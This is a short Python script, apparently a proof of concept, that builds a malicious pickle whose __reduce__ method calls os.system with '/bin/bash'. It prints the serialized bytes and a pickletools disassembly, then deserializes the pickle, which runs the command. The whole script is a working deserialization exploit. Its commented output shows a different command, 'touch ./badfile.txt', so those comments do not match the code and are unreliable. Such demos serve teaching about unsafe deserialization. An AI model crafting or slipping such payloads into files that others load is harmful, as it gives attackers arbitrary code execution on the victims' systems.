import pickle
import os
import pickletools


class PickleBomb:
    def __reduce__(self):
        cmd = ('/bin/bash')
        return os.system, (cmd,)
      
pickled = pickle.dumps(PickleBomb())

print(pickled)
# b'\x80\x03cposix\nsystem\nq\x00X\x13\x00\x00\x00touch ./badfile.txtq\x01\x85q\x02Rq\x03.'

print(pickletools.dis(pickled))
#     0: \x80 PROTO      3
#     2: c    GLOBAL     'posix system'
#    16: q    BINPUT     0
#    18: X    BINUNICODE 'touch ./badfile.txt'
#    42: q    BINPUT     1
#    44: \x85 TUPLE1
#    45: q    BINPUT     2
#    47: R    REDUCE
#    48: q    BINPUT     3
#    50: .    STOP
# highest protocol among opcodes = 2

pickle.loads(pickled)